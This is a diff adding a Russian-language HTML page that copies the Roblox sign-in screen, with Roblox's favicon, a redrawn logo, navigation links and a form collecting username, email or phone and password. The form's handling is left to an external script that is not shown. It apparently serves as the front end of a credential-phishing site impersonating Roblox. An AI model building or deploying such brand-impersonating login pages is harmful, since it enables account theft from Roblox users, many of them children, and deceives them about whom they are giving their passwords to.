@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Фон -->
+    <div class="bg-image"></div>
+
+    <!-- Навигация -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="#" class="logo">
+                <svg viewBox="0 0 120 30">
+                    <path d="M8.8 1.4L21.2 3.6c.8.1 1.4.9 1.2 1.7l-2.6 14.8c-.1.8-.9 1.4-1.7 1.2L5.7 19.1c-.8-.1-1.4-.9-1.2-1.7L7.1 2.6c.1-.8.9-1.4 1.7-1.2z" fill="#ffffff"/>
+                    <path d="M10.9 7.7l-1.1 6.4 6.4 1.1 1.1-6.4-6.4-1.1z" fill="#191b1f"/>
+                    <text x="30" y="21" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="20" letter-spacing="-0.5">ROBLOX</text>
+                </svg>
+            </a>
+            <div class="nav-links">
+                <a href="#">Диаграммы</a>
+                <a href="#">Торговая площадка</a>
+                <a href="#">Создавать</a>
+                <a href="#">Робукс</a>
+            </div>
+        </div>
+        <div class="nav-right">
+            <div class="search-bar">
+                <svg class="search-icon" viewBox="0 0 24 24" width="16" height="16" fill="#b8b8b8">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+                </svg>
+                <input type="text" placeholder="Поиск">
+            </div>
+            <a href="#" class="register-btn">Зарегистрироваться</a>
+        </div>
+    </nav>
+
+    <!-- Модалка входа -->
+    <div class="login-container">
+        <h1>Войти в Roblox</h1>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <button type="submit" class="login-btn">Авторизоваться</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#">Забыли пароль или имя пользователя?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="login-options">
+            <button class="secondary-btn">Отправить мне одноразовый код по электронной почте</button>
+            <button class="secondary-btn">Быстрый вход</button>
+            <button class="secondary-btn">Другие варианты входа в систему</button>
+        </div>
+
+        <div class="footer-text">
+            У вас нет аккаунта? <a href="#">Зарегистрируйтесь</a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
